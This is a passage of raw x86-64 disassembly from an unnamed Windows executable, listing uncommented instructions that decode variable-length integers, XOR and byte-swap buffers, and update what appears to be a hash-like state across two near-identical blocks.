   140058a20:	test   al,0x1
   140058a22:	jne    0x140058b0f
   140058a28:	cmp    DWORD PTR [rbp+0x7d0],0x1
   140058a2f:	jne    0x140058afb
   140058a35:	mov    rax,QWORD PTR [rbp+0x7e8]
   140058a3c:	mov    r9,QWORD PTR [rbp+0x7d8]
   140058a43:	mov    rdx,QWORD PTR [rbp+0x7e0]
   140058a4a:	mov    rcx,QWORD PTR [rbp+0x7f0]
   140058a51:	mov    r8,r9
   140058a54:	test   rax,rax
   140058a57:	je     0x140058a5e
   140058a59:	cmp    rax,rcx
   140058a5c:	jne    0x140058a74
   140058a5e:	test   r8,r8
   140058a61:	je     0x140058a8f
   140058a63:	cmp    r8,rdx
   140058a66:	je     0x140058a8f
   140058a68:	lea    rcx,[r8+0x10]
   140058a6c:	mov    r9,rcx
   140058a6f:	mov    rax,r8
   140058a72:	jmp    0x140058a51
   140058a74:	lea    rdx,[rax+0x8]
   140058a78:	mov    QWORD PTR [rbp+0x7f0],rcx
   140058a7f:	mov    QWORD PTR [rbp+0x7e8],rdx
   140058a86:	mov    QWORD PTR [rbp+0x7d8],r8
   140058a8d:	jmp    0x140058ace
   140058a8f:	mov    QWORD PTR [rbp+0x7f0],rcx
   140058a96:	and    QWORD PTR [rbp+0x7e8],0x0
   140058a9e:	mov    QWORD PTR [rbp+0x7d8],r8
   140058aa5:	mov    rax,QWORD PTR [rbp+0x7f8]
   140058aac:	test   rax,rax
   140058aaf:	je     0x140058afb
   140058ab1:	lea    rcx,[rax+0x8]
   140058ab5:	cmp    rax,QWORD PTR [rbp+0x800]
   140058abc:	mov    edx,0x0
   140058ac1:	cmovne rdx,rcx
   140058ac5:	mov    QWORD PTR [rbp+0x7f8],rdx
   140058acc:	je     0x140058afb
   140058ace:	mov    rax,QWORD PTR [rax]
   140058ad1:	mov    QWORD PTR [rbp+0x808],0x1
   140058adc:	and    QWORD PTR [rbp+0x810],0x0
   140058ae4:	mov    QWORD PTR [rbp+0x818],0x8
   140058aef:	mov    QWORD PTR [rbp+0x820],rax
   140058af6:	jmp    0x140058a14
   140058afb:	lea    rcx,[rbp+0x828]
   140058b02:	call   0x14003c06c
   140058b07:	test   al,0x1
   140058b09:	je     0x140059ce9
   140058b0f:	mov    ebx,edx
   140058b11:	mov    r8,QWORD PTR [rbp+0x5b8]
   140058b18:	mov    r9,QWORD PTR [rbp+0x5c0]
   140058b1f:	lea    rax,[r8+0x8]
   140058b23:	cmp    rax,r9
   140058b26:	ja     0x1400590fd
   140058b2c:	mov    rax,QWORD PTR [rbp+0x5b0]
   140058b33:	cmp    rax,0x8
   140058b37:	jae    0x140059087
   140058b3d:	mov    rcx,QWORD PTR [rbp+0x550]
   140058b44:	cmp    rcx,QWORD PTR [rbp+0x558]
   140058b4b:	jae    0x140058b91
   140058b4d:	mov    rcx,QWORD PTR [rbp+0x508]
   140058b54:	mov    rdx,QWORD PTR [rbp+0x548]
   140058b5b:	cmp    rdx,rcx
   140058b5e:	jae    0x140058b91
   140058b60:	mov    rax,QWORD PTR [rbp+0x1170]
   140058b67:	movzx  esi,BYTE PTR [rax+rdx*1]
   140058b6b:	and    esi,0x7f
   140058b6e:	inc    rdx
   140058b71:	cmp    rdx,rcx
   140058b74:	jae    0x140058b9c
   140058b76:	mov    rax,QWORD PTR [rbp+0x1170]
   140058b7d:	movzx  eax,BYTE PTR [rax+rdx*1]
   140058b81:	test   al,al
   140058b83:	jns    0x140058b99
   140058b85:	shl    rsi,0x7
   140058b89:	and    eax,0x7f
   140058b8c:	or     rsi,rax
   140058b8f:	jmp    0x140058b6e
   140058b91:	xor    r11d,r11d
   140058b94:	jmp    0x140059003
   140058b99:	mov    rcx,rdx
   140058b9c:	mov    QWORD PTR [rbp+0x548],rcx
   140058ba3:	mov    rax,rsi
   140058ba6:	shr    rax,0x8
   140058baa:	mov    rdi,rsi
   140058bad:	shr    rdi,0x28
   140058bb1:	movaps XMMWORD PTR [rbp+0xcf0],xmm7
   140058bb8:	movaps XMMWORD PTR [rbp+0xce0],xmm7
   140058bbf:	movaps XMMWORD PTR [rbp+0xcd0],xmm7
   140058bc6:	movaps XMMWORD PTR [rbp+0xcc0],xmm7
   140058bcd:	mov    DWORD PTR [rbp+0xd10],eax
   140058bd3:	lea    rax,[rip+0x2f47e]        # 0x140088058
   140058bda:	mov    QWORD PTR [rsp+0x20],rax
   140058bdf:	lea    rcx,[rbp+0xcc0]
   140058be6:	push   0x4
   140058be8:	pop    rdx
   140058be9:	lea    r8,[rbp+0xd10]
   140058bf0:	mov    r9,rdx
   140058bf3:	call   0x1400638fe
   140058bf8:	mov    BYTE PTR [rbp+0xcc4],dil
   140058bff:	mov    r15,QWORD PTR [rbp+0x520]
   140058c06:	cmp    QWORD PTR [rbp+0x568],r15
   140058c0d:	jbe    0x140058d39
   140058c13:	mov    r9,QWORD PTR [rbp+0x528]
   140058c1a:	cmp    r9,0x4
   140058c1e:	ja     0x140059d9c
   140058c24:	mov    rcx,QWORD PTR [rbp+0x530]
   140058c2b:	cmp    rcx,0x5
   140058c2f:	jae    0x140059dae
   140058c35:	mov    rdi,QWORD PTR [rbp+0x568]
   140058c3c:	cmp    rdi,r15
   140058c3f:	je     0x140059dbc
   140058c45:	mov    r8,rdi
   140058c48:	mov    eax,DWORD PTR [rbp+rcx*4+0x578]
   140058c4f:	mov    cl,BYTE PTR [rbp+0x538]
   140058c55:	rol    eax,cl
   140058c57:	sub    r8,r15
   140058c5a:	xor    eax,DWORD PTR [rbp+r9*4+0x578]
   140058c62:	xor    edx,edx
   140058c64:	div    r8
   140058c67:	mov    r13,rdx
   140058c6a:	mov    rax,QWORD PTR [rbp+0x570]
   140058c71:	mov    QWORD PTR [rbp+0x710],rax
   140058c78:	cmp    r15,0x40
   140058c7c:	push   0x40
   140058c7e:	pop    rax
   140058c7f:	cmovae r15,rax
   140058c83:	movaps XMMWORD PTR [rbp+0xd40],xmm7
   140058c8a:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   140058c91:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   140058c98:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   140058c9f:	lea    rcx,[rbp+0xd10]
   140058ca6:	mov    rdx,r15
   140058ca9:	call   0x14003c0b8
   140058cae:	test   rdi,rdi
   140058cb1:	je     0x140058cff
   140058cb3:	mov    rcx,rax
   140058cb6:	mov    r8,rdx
   140058cb9:	mov    rax,rdx
   140058cbc:	add    rax,r13
   140058cbf:	mov    r9,QWORD PTR [rbp+0x560]
   140058cc6:	cmp    rax,rdi
   140058cc9:	jbe    0x140058ce9
   140058ccb:	xor    r10d,r10d
   140058cce:	cmp    r8,r10
   140058cd1:	je     0x140058cff
   140058cd3:	lea    rax,[r10+r13*1]
   140058cd7:	xor    edx,edx
   140058cd9:	div    rdi
   140058cdc:	mov    al,BYTE PTR [r9+rdx*1]
   140058ce0:	mov    BYTE PTR [rcx+r10*1],al
   140058ce4:	inc    r10
   140058ce7:	jmp    0x140058cce
   140058ce9:	add    r9,r13
   140058cec:	xor    eax,eax
   140058cee:	cmp    r8,rax
   140058cf1:	je     0x140058cff
   140058cf3:	mov    dl,BYTE PTR [r9+rax*1]
   140058cf7:	mov    BYTE PTR [rcx+rax*1],dl
   140058cfa:	inc    rax
   140058cfd:	jmp    0x140058cee
   140058cff:	mov    rcx,QWORD PTR [rbp+0x518]
   140058d06:	xor    eax,eax
   140058d08:	cmp    r15,rax
   140058d0b:	je     0x140058d39
   140058d0d:	cmp    rcx,0x3f
   140058d11:	ja     0x140059d8e
   140058d17:	mov    edx,eax
   140058d19:	and    edx,0x7
   140058d1c:	mov    dl,BYTE PTR [rbp+rdx*1+0x710]
   140058d23:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   140058d2a:	inc    rax
   140058d2d:	mov    BYTE PTR [rbp+rcx*1+0xcc0],dl
   140058d34:	inc    rcx
   140058d37:	jmp    0x140058d08
   140058d39:	movaps XMMWORD PTR [rbp+0x740],xmm7
   140058d40:	movaps XMMWORD PTR [rbp+0x730],xmm7
   140058d47:	movaps XMMWORD PTR [rbp+0x720],xmm7
   140058d4e:	movaps XMMWORD PTR [rbp+0x710],xmm7
   140058d55:	xor    eax,eax
   140058d57:	cmp    rax,0x40
   140058d5b:	je     0x140058d73
   140058d5d:	mov    ecx,DWORD PTR [rbp+rax*1+0xcc0]
   140058d64:	bswap  ecx
   140058d66:	mov    DWORD PTR [rbp+rax*1+0x710],ecx
   140058d6d:	add    rax,0x4
   140058d71:	jmp    0x140058d57
   140058d73:	movups xmm0,XMMWORD PTR [rbp+0x578]
   140058d7a:	mov    eax,DWORD PTR [rbp+0x588]
   140058d80:	movups XMMWORD PTR [rbp+0xd10],xmm0
   140058d87:	mov    DWORD PTR [rbp+0xd20],eax
   140058d8d:	and    DWORD PTR [rbp+0xd24],0x0
   140058d94:	movaps xmm0,XMMWORD PTR [rbp+0x710]
   140058d9b:	movaps xmm1,XMMWORD PTR [rbp+0x720]
   140058da2:	movaps xmm2,XMMWORD PTR [rbp+0x730]
   140058da9:	movaps xmm3,XMMWORD PTR [rbp+0x740]
   140058db0:	lea    rax,[rbp+0xd28]
   140058db7:	movups XMMWORD PTR [rax+0x30],xmm3
   140058dbb:	movups XMMWORD PTR [rax+0x20],xmm2
   140058dbf:	movups XMMWORD PTR [rax+0x10],xmm1
   140058dc3:	movups XMMWORD PTR [rax],xmm0
   140058dc6:	call   0x140064214
   140058dcb:	mov    al,BYTE PTR [rip+0x3fcbc]        # 0x140098a8d
   140058dd1:	cmp    al,0x1
   140058dd3:	je     0x140058e1c
   140058dd5:	movzx  eax,al
   140058dd8:	cmp    eax,0x2
   140058ddb:	je     0x140058ec2
   140058de1:	and    DWORD PTR [rbp+0x640],0x0
   140058de8:	lea    rcx,[rip+0xfffffffffffa8291]        # 0x140001080
   140058def:	mov    rdx,QWORD PTR [rbp+0x1150]
   140058df6:	push   0x40
   140058df8:	pop    r8
   140058dfa:	lea    r9,[rbp+0x640]
   140058e01:	call   QWORD PTR [rip+0x3ba01]        # 0x140094808
   140058e07:	test   eax,eax
   140058e09:	sete   cl
   140058e0c:	inc    cl
   140058e0e:	mov    BYTE PTR [rip+0x3fc79],cl        # 0x140098a8d
   140058e14:	test   eax,eax
   140058e16:	je     0x140058ec2
   140058e1c:	mov    al,BYTE PTR [rip+0x3fd96]        # 0x140098bb8
   140058e22:	cmp    al,0x1
   140058e24:	je     0x140058e49
   140058e26:	movzx  eax,al
   140058e29:	test   eax,eax
   140058e2b:	jne    0x140058ec2
   140058e31:	call   0x140065d51
   140058e36:	test   rax,rax
   140058e39:	sete   cl
   140058e3c:	inc    cl
   140058e3e:	mov    BYTE PTR [rip+0x3fd74],cl        # 0x140098bb8
   140058e44:	test   rax,rax
   140058e47:	je     0x140058ec2
   140058e49:	call   0x140064227
   140058e4e:	mov    eax,0xc8c291de
   140058e53:	xchg   DWORD PTR [rip+0x3fc87],eax        # 0x140098ae0
   140058e59:	call   QWORD PTR [rip+0x3b7f1]        # 0x140094650
   140058e5f:	mov    eax,eax
   140058e61:	mov    QWORD PTR [rip+0x3f198],rax        # 0x140098000
   140058e68:	lea    rcx,[rbp+0xd10]
   140058e6f:	push   0xffffffffffffffff
   140058e71:	pop    rdx
   140058e72:	call   0x140010840
   140058e77:	xor    eax,eax
   140058e79:	xchg   DWORD PTR [rip+0x3fc61],eax        # 0x140098ae0
   140058e7f:	mov    BYTE PTR [rip+0x3fc08],0x0        # 0x140098a8e
   140058e86:	mov    eax,DWORD PTR [rbp+0xd10]
   140058e8c:	add    DWORD PTR [rbp+0x578],eax
   140058e92:	mov    eax,DWORD PTR [rbp+0xd14]
   140058e98:	add    DWORD PTR [rbp+0x57c],eax
   140058e9e:	mov    eax,DWORD PTR [rbp+0xd18]
   140058ea4:	add    DWORD PTR [rbp+0x580],eax
   140058eaa:	mov    eax,DWORD PTR [rbp+0xd1c]
   140058eb0:	add    DWORD PTR [rbp+0x584],eax
   140058eb6:	mov    eax,DWORD PTR [rbp+0xd20]
   140058ebc:	add    DWORD PTR [rbp+0x588],eax
   140058ec2:	mov    BYTE PTR [rip+0x3fbc3],0x0        # 0x140098a8c
   140058ec9:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   140058ed0:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   140058ed7:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   140058ede:	xor    eax,eax
   140058ee0:	cmp    rax,0x14
   140058ee4:	je     0x140058efc
   140058ee6:	mov    ecx,DWORD PTR [rbp+rax*1+0x578]
   140058eed:	bswap  ecx
   140058eef:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   140058ef6:	add    rax,0x4
   140058efa:	jmp    0x140058ee0
   140058efc:	mov    r8,QWORD PTR [rbp+0x510]
   140058f03:	mov    eax,esi
   140058f05:	shr    eax,0x3
   140058f08:	and    eax,0x1f
   140058f0b:	lea    rcx,[rax+rbp*1]
   140058f0f:	add    rcx,0xd10
   140058f16:	xor    r9d,r9d
   140058f19:	xor    edx,edx
   140058f1b:	xor    eax,eax
   140058f1d:	cmp    r9,0x10
   140058f21:	je     0x140058f3c
   140058f23:	shld   rax,rdx,0x8
   140058f28:	mov    r10,rdx
   140058f2b:	shl    r10,0x8
   140058f2f:	movzx  edx,BYTE PTR [rcx+r9*1]
   140058f34:	inc    r9
   140058f37:	or     rdx,r10
   140058f3a:	jmp    0x140058f1d
   140058f3c:	push   0xffffffffffffffff
   140058f3e:	pop    r9
   140058f40:	mov    r10,r9
   140058f43:	mov    ecx,r8d
   140058f46:	shl    r10,cl
   140058f49:	cmp    r8,0x40
   140058f4d:	not    r10
   140058f50:	cmovae r10,r9
   140058f54:	and    esi,0x7
   140058f57:	lea    ecx,[r8+rsi*1]
   140058f5b:	neg    cl
   140058f5d:	shrd   rdx,rax,cl
   140058f61:	shr    rax,cl
   140058f64:	test   cl,0x40
   140058f67:	cmove  rax,rdx
   140058f6b:	and    rax,r10
   140058f6e:	mov    rsi,QWORD PTR [rbp+0x550]
   140058f75:	add    r8,0x7
   140058f79:	bswap  rax
   140058f7c:	shr    r8,0x3
   140058f80:	mov    QWORD PTR [rbp+0x710],rax
   140058f87:	mov    r9,rsi
   140058f8a:	imul   r9,r8
   140058f8e:	push   0x8
   140058f90:	pop    rcx
   140058f91:	sub    rcx,r8
   140058f94:	dec    r8
   140058f97:	mov    rax,QWORD PTR [rbp+0xf60]
   140058f9e:	lea    r11,[rax+r9*1]
   140058fa2:	mov    rax,r9
   140058fa5:	xor    edx,edx
   140058fa7:	push   0x14
   140058fa9:	pop    rdi
   140058faa:	div    rdi
   140058fad:	cmp    rcx,0x8
   140058fb1:	je     0x140058fd7
   140058fb3:	cmp    r8,0x7
   140058fb7:	ja     0x140059d80
   140058fbd:	imul   rax,rax,0xffffffffffffffec
   140058fc1:	mov    al,BYTE PTR [r11+rax*1]
   140058fc5:	xor    BYTE PTR [rbp+rcx*1+0x710],al
   140058fcc:	inc    rcx
   140058fcf:	inc    r11
   140058fd2:	inc    r9
   140058fd5:	jmp    0x140058fa2
   140058fd7:	mov    r11,QWORD PTR [rbp+0x710]
   140058fde:	bswap  r11
   140058fe1:	and    r11,r10
   140058fe4:	inc    rsi
   140058fe7:	mov    QWORD PTR [rbp+0x550],rsi
   140058fee:	mov    r9,QWORD PTR [rbp+0x5c0]
   140058ff5:	mov    rax,QWORD PTR [rbp+0x5b0]
   140058ffc:	mov    r8,QWORD PTR [rbp+0x5b8]
   140059003:	mov    rdx,r9
   140059006:	sub    rdx,r8
   140059009:	sub    rdx,rax
   14005900c:	mov    rcx,QWORD PTR [rbp+0x510]
   140059013:	cmp    rdx,rcx
   140059016:	cmovae rdx,rcx
   14005901a:	cmp    rdx,0x1
   14005901e:	adc    rdx,0x0
   140059022:	mov    r10d,ecx
   140059025:	sub    r10d,edx
   140059028:	and    r10b,0x3f
   14005902c:	cmp    rcx,rdx
   14005902f:	movzx  ecx,r10b
   140059033:	mov    r10d,0x0
   140059039:	cmovbe ecx,r10d
   14005903d:	shr    r11,cl
   140059040:	mov    r10,QWORD PTR [rbp+0x5a0]
   140059047:	mov    rsi,QWORD PTR [rbp+0x5a8]
   14005904e:	mov    ecx,edx
   140059050:	shld   rsi,r10,cl
   140059054:	shl    r10,cl
   140059057:	test   dl,0x40
   14005905a:	cmovne rsi,r10
   14005905e:	mov    ecx,0x0
   140059063:	cmove  rcx,r10
   140059067:	or     rcx,r11
   14005906a:	mov    QWORD PTR [rbp+0x5a8],rsi
   140059071:	mov    QWORD PTR [rbp+0x5a0],rcx
   140059078:	add    rax,rdx
   14005907b:	mov    QWORD PTR [rbp+0x5b0],rax
   140059082:	jmp    0x140058b33
   140059087:	add    rax,0xfffffffffffffff8
   14005908b:	mov    QWORD PTR [rbp+0x5b0],rax
   140059092:	mov    r9,QWORD PTR [rbp+0x5a8]
   140059099:	mov    r10,r9
   14005909c:	mov    ecx,eax
   14005909e:	shr    r10,cl
   1400590a1:	mov    r11,QWORD PTR [rbp+0x5a0]
   1400590a8:	mov    rdx,r11
   1400590ab:	shrd   rdx,r9,cl
   1400590af:	push   0xffffffffffffffff
   1400590b1:	pop    rdi
   1400590b2:	mov    rsi,rdi
   1400590b5:	shl    rsi,cl
   1400590b8:	test   al,0x40
   1400590ba:	cmovne rdx,r10
   1400590be:	mov    ecx,0x0
   1400590c3:	cmove  rcx,rsi
   1400590c7:	cmove  rsi,rdi
   1400590cb:	not    rsi
   1400590ce:	not    rcx
   1400590d1:	and    rcx,r11
   1400590d4:	and    rsi,r9
   1400590d7:	test   rax,rax
   1400590da:	cmove  rsi,rax
   1400590de:	cmove  rcx,rax
   1400590e2:	mov    QWORD PTR [rbp+0x5a0],rcx
   1400590e9:	mov    QWORD PTR [rbp+0x5a8],rsi
   1400590f0:	add    r8,0x8
   1400590f4:	mov    QWORD PTR [rbp+0x5b8],r8
   1400590fb:	xor    bl,dl
   1400590fd:	mov    r8,QWORD PTR [rbp+0x1038]
   140059104:	mov    r9,QWORD PTR [rbp+0x1040]
   14005910b:	lea    rax,[r8+0x8]
   14005910f:	cmp    rax,r9
   140059112:	jbe    0x14005911b
   140059114:	xor    esi,esi
   140059116:	jmp    0x1400596ea
   14005911b:	mov    rax,QWORD PTR [rbp+0x1030]
   140059122:	cmp    rax,0x8
   140059126:	jae    0x140059676
   14005912c:	mov    rcx,QWORD PTR [rbp+0xfd0]
   140059133:	cmp    rcx,QWORD PTR [rbp+0xfd8]
   14005913a:	jae    0x140059180
   14005913c:	mov    rcx,QWORD PTR [rbp+0xf88]
   140059143:	mov    rdx,QWORD PTR [rbp+0xfc8]
   14005914a:	cmp    rdx,rcx
   14005914d:	jae    0x140059180
   14005914f:	mov    rax,QWORD PTR [rbp+0x1180]
   140059156:	movzx  esi,BYTE PTR [rax+rdx*1]
   14005915a:	and    esi,0x7f
   14005915d:	inc    rdx
   140059160:	cmp    rdx,rcx
   140059163:	jae    0x14005918b
   140059165:	mov    rax,QWORD PTR [rbp+0x1180]
   14005916c:	movzx  eax,BYTE PTR [rax+rdx*1]
   140059170:	test   al,al
   140059172:	jns    0x140059188
   140059174:	shl    rsi,0x7
   140059178:	and    eax,0x7f
   14005917b:	or     rsi,rax
   14005917e:	jmp    0x14005915d
   140059180:	xor    r11d,r11d
   140059183:	jmp    0x1400595f2
   140059188:	mov    rcx,rdx
   14005918b:	mov    QWORD PTR [rbp+0xfc8],rcx
   140059192:	mov    rax,rsi
   140059195:	shr    rax,0x8
   140059199:	mov    rdi,rsi
   14005919c:	shr    rdi,0x28
   1400591a0:	movaps XMMWORD PTR [rbp+0xcf0],xmm7
   1400591a7:	movaps XMMWORD PTR [rbp+0xce0],xmm7
   1400591ae:	movaps XMMWORD PTR [rbp+0xcd0],xmm7
   1400591b5:	movaps XMMWORD PTR [rbp+0xcc0],xmm7
   1400591bc:	mov    DWORD PTR [rbp+0xd10],eax
   1400591c2:	lea    rax,[rip+0x2ee8f]        # 0x140088058
   1400591c9:	mov    QWORD PTR [rsp+0x20],rax
   1400591ce:	lea    rcx,[rbp+0xcc0]
   1400591d5:	push   0x4
   1400591d7:	pop    rdx
   1400591d8:	lea    r8,[rbp+0xd10]
   1400591df:	mov    r9,rdx
   1400591e2:	call   0x1400638fe
   1400591e7:	mov    BYTE PTR [rbp+0xcc4],dil
   1400591ee:	mov    r15,QWORD PTR [rbp+0xfa0]
   1400591f5:	cmp    QWORD PTR [rbp+0xfe8],r15
   1400591fc:	jbe    0x140059328
   140059202:	mov    r9,QWORD PTR [rbp+0xfa8]
   140059209:	cmp    r9,0x4
   14005920d:	ja     0x140059d9c
   140059213:	mov    rcx,QWORD PTR [rbp+0xfb0]
   14005921a:	cmp    rcx,0x5
   14005921e:	jae    0x140059dae
   140059224:	mov    rdi,QWORD PTR [rbp+0xfe8]
   14005922b:	cmp    rdi,r15
   14005922e:	je     0x140059dbc
   140059234:	mov    r8,rdi
   140059237:	mov    eax,DWORD PTR [rbp+rcx*4+0xff8]
   14005923e:	mov    cl,BYTE PTR [rbp+0xfb8]
   140059244:	rol    eax,cl
   140059246:	sub    r8,r15
   140059249:	xor    eax,DWORD PTR [rbp+r9*4+0xff8]
   140059251:	xor    edx,edx
   140059253:	div    r8
   140059256:	mov    r13,rdx
   140059259:	mov    rax,QWORD PTR [rbp+0xff0]
   140059260:	mov    QWORD PTR [rbp+0x710],rax
   140059267:	cmp    r15,0x40
   14005926b:	push   0x40
   14005926d:	pop    rax
   14005926e:	cmovae r15,rax
   140059272:	movaps XMMWORD PTR [rbp+0xd40],xmm7
   140059279:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   140059280:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   140059287:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   14005928e:	lea    rcx,[rbp+0xd10]
   140059295:	mov    rdx,r15
   140059298:	call   0x14003c0b8
   14005929d:	test   rdi,rdi
   1400592a0:	je     0x1400592ee
   1400592a2:	mov    rcx,rax
   1400592a5:	mov    r8,rdx
   1400592a8:	mov    rax,rdx
   1400592ab:	add    rax,r13
   1400592ae:	mov    r9,QWORD PTR [rbp+0xfe0]
   1400592b5:	cmp    rax,rdi
   1400592b8:	jbe    0x1400592d8
   1400592ba:	xor    r10d,r10d
   1400592bd:	cmp    r8,r10
   1400592c0:	je     0x1400592ee
   1400592c2:	lea    rax,[r10+r13*1]
   1400592c6:	xor    edx,edx
   1400592c8:	div    rdi
   1400592cb:	mov    al,BYTE PTR [r9+rdx*1]
   1400592cf:	mov    BYTE PTR [rcx+r10*1],al
   1400592d3:	inc    r10
   1400592d6:	jmp    0x1400592bd
   1400592d8:	add    r9,r13
   1400592db:	xor    eax,eax
   1400592dd:	cmp    r8,rax
   1400592e0:	je     0x1400592ee
   1400592e2:	mov    dl,BYTE PTR [r9+rax*1]
   1400592e6:	mov    BYTE PTR [rcx+rax*1],dl
   1400592e9:	inc    rax
   1400592ec:	jmp    0x1400592dd
   1400592ee:	mov    rcx,QWORD PTR [rbp+0xf98]
   1400592f5:	xor    eax,eax
   1400592f7:	cmp    r15,rax
   1400592fa:	je     0x140059328
   1400592fc:	cmp    rcx,0x3f
   140059300:	ja     0x140059d8e
   140059306:	mov    edx,eax
   140059308:	and    edx,0x7
   14005930b:	mov    dl,BYTE PTR [rbp+rdx*1+0x710]
   140059312:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   140059319:	inc    rax
   14005931c:	mov    BYTE PTR [rbp+rcx*1+0xcc0],dl
   140059323:	inc    rcx
   140059326:	jmp    0x1400592f7
   140059328:	movaps XMMWORD PTR [rbp+0x740],xmm7
   14005932f:	movaps XMMWORD PTR [rbp+0x730],xmm7
   140059336:	movaps XMMWORD PTR [rbp+0x720],xmm7
   14005933d:	movaps XMMWORD PTR [rbp+0x710],xmm7
   140059344:	xor    eax,eax
   140059346:	cmp    rax,0x40
   14005934a:	je     0x140059362
   14005934c:	mov    ecx,DWORD PTR [rbp+rax*1+0xcc0]
   140059353:	bswap  ecx
   140059355:	mov    DWORD PTR [rbp+rax*1+0x710],ecx
   14005935c:	add    rax,0x4
   140059360:	jmp    0x140059346
   140059362:	movups xmm0,XMMWORD PTR [rbp+0xff8]
   140059369:	mov    eax,DWORD PTR [rbp+0x1008]
   14005936f:	movups XMMWORD PTR [rbp+0xd10],xmm0
   140059376:	mov    DWORD PTR [rbp+0xd20],eax
   14005937c:	and    DWORD PTR [rbp+0xd24],0x0
   140059383:	movaps xmm0,XMMWORD PTR [rbp+0x710]
   14005938a:	movaps xmm1,XMMWORD PTR [rbp+0x720]
   140059391:	movaps xmm2,XMMWORD PTR [rbp+0x730]
   140059398:	movaps xmm3,XMMWORD PTR [rbp+0x740]
   14005939f:	lea    rax,[rbp+0xd28]
   1400593a6:	movups XMMWORD PTR [rax+0x30],xmm3
   1400593aa:	movups XMMWORD PTR [rax+0x20],xmm2
   1400593ae:	movups XMMWORD PTR [rax+0x10],xmm1
   1400593b2:	movups XMMWORD PTR [rax],xmm0
   1400593b5:	call   0x140064214
   1400593ba:	mov    al,BYTE PTR [rip+0x3f6cd]        # 0x140098a8d
   1400593c0:	cmp    al,0x1
   1400593c2:	je     0x14005940b
   1400593c4:	movzx  eax,al
   1400593c7:	cmp    eax,0x2
   1400593ca:	je     0x1400594b1
   1400593d0:	and    DWORD PTR [rbp+0x640],0x0
   1400593d7:	lea    rcx,[rip+0xfffffffffffa7ca2]        # 0x140001080
   1400593de:	mov    rdx,QWORD PTR [rbp+0x1150]
   1400593e5:	push   0x40
   1400593e7:	pop    r8
   1400593e9:	lea    r9,[rbp+0x640]
   1400593f0:	call   QWORD PTR [rip+0x3b412]        # 0x140094808
   1400593f6:	test   eax,eax
   1400593f8:	sete   cl
   1400593fb:	inc    cl
   1400593fd:	mov    BYTE PTR [rip+0x3f68a],cl        # 0x140098a8d
   140059403:	test   eax,eax
   140059405:	je     0x1400594b1
   14005940b:	mov    al,BYTE PTR [rip+0x3f7a7]        # 0x140098bb8
   140059411:	cmp    al,0x1
   140059413:	je     0x140059438
   140059415:	movzx  eax,al
   140059418:	test   eax,eax
   14005941a:	jne    0x1400594b1
   140059420:	call   0x140065d51
   140059425:	test   rax,rax
   140059428:	sete   cl
   14005942b:	inc    cl
   14005942d:	mov    BYTE PTR [rip+0x3f785],cl        # 0x140098bb8
   140059433:	test   rax,rax
   140059436:	je     0x1400594b1
   140059438:	call   0x140064227
   14005943d:	mov    eax,0xc8c291de
   140059442:	xchg   DWORD PTR [rip+0x3f698],eax        # 0x140098ae0
   140059448:	call   QWORD PTR [rip+0x3b202]        # 0x140094650
   14005944e:	mov    eax,eax
   140059450:	mov    QWORD PTR [rip+0x3eba9],rax        # 0x140098000
   140059457:	lea    rcx,[rbp+0xd10]
   14005945e:	push   0xffffffffffffffff
   140059460:	pop    rdx
   140059461:	call   0x140010840
   140059466:	xor    eax,eax
   140059468:	xchg   DWORD PTR [rip+0x3f672],eax        # 0x140098ae0
   14005946e:	mov    BYTE PTR [rip+0x3f619],0x0        # 0x140098a8e
   140059475:	mov    eax,DWORD PTR [rbp+0xd10]
   14005947b:	add    DWORD PTR [rbp+0xff8],eax
   140059481:	mov    eax,DWORD PTR [rbp+0xd14]
   140059487:	add    DWORD PTR [rbp+0xffc],eax
   14005948d:	mov    eax,DWORD PTR [rbp+0xd18]
   140059493:	add    DWORD PTR [rbp+0x1000],eax
   140059499:	mov    eax,DWORD PTR [rbp+0xd1c]
   14005949f:	add    DWORD PTR [rbp+0x1004],eax
   1400594a5:	mov    eax,DWORD PTR [rbp+0xd20]
   1400594ab:	add    DWORD PTR [rbp+0x1008],eax
   1400594b1:	mov    BYTE PTR [rip+0x3f5d4],0x0        # 0x140098a8c
   1400594b8:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   1400594bf:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   1400594c6:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   1400594cd:	xor    eax,eax
   1400594cf:	cmp    rax,0x14
   1400594d3:	je     0x1400594eb
   1400594d5:	mov    ecx,DWORD PTR [rbp+rax*1+0xff8]
   1400594dc:	bswap  ecx
   1400594de:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   1400594e5:	add    rax,0x4
   1400594e9:	jmp    0x1400594cf
   1400594eb:	mov    r8,QWORD PTR [rbp+0xf90]
   1400594f2:	mov    eax,esi
   1400594f4:	shr    eax,0x3
   1400594f7:	and    eax,0x1f
   1400594fa:	lea    rcx,[rax+rbp*1]
   1400594fe:	add    rcx,0xd10
   140059505:	xor    r9d,r9d
   140059508:	xor    edx,edx
   14005950a:	xor    eax,eax
   14005950c:	cmp    r9,0x10
   140059510:	je     0x14005952b
   140059512:	shld   rax,rdx,0x8
   140059517:	mov    r10,rdx
   14005951a:	shl    r10,0x8
   14005951e:	movzx  edx,BYTE PTR [rcx+r9*1]
   140059523:	inc    r9
   140059526:	or     rdx,r10
   140059529:	jmp    0x14005950c
   14005952b:	push   0xffffffffffffffff
   14005952d:	pop    r9
   14005952f:	mov    r10,r9
   140059532:	mov    ecx,r8d
   140059535:	shl    r10,cl
   140059538:	cmp    r8,0x40
   14005953c:	not    r10
   14005953f:	cmovae r10,r9
   140059543:	and    esi,0x7
   140059546:	lea    ecx,[r8+rsi*1]
   14005954a:	neg    cl
   14005954c:	shrd   rdx,rax,cl
   140059550:	shr    rax,cl
   140059553:	test   cl,0x40
   140059556:	cmove  rax,rdx
   14005955a:	and    rax,r10
   14005955d:	mov    rsi,QWORD PTR [rbp+0xfd0]
   140059564:	add    r8,0x7
   140059568:	bswap  rax
   14005956b:	shr    r8,0x3
